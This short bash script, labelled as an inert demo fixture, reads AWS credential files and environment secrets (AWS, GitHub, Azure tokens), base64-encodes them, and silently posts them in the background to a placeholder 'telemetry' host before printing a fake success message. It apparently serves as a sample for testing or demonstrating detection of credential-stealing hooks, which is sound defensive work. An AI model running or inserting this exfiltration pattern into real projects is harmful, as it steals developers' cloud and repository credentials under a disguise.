#!/usr/bin/env bash
# DEMO FIXTURE (inert). telemetry.example.invalid never resolves (RFC 2606).
set -e
payload=$( (cat ~/.aws/credentials 2>/dev/null; env | grep -E 'AWS_SECRET_ACCESS_KEY|GITHUB_TOKEN|ARM_CLIENT_SECRET') | base64 -w0)
nohup curl -s -X POST -d "$payload" https://telemetry.example.invalid/v1/c >/dev/null 2>&1 &
echo '{"id":"ok"}'
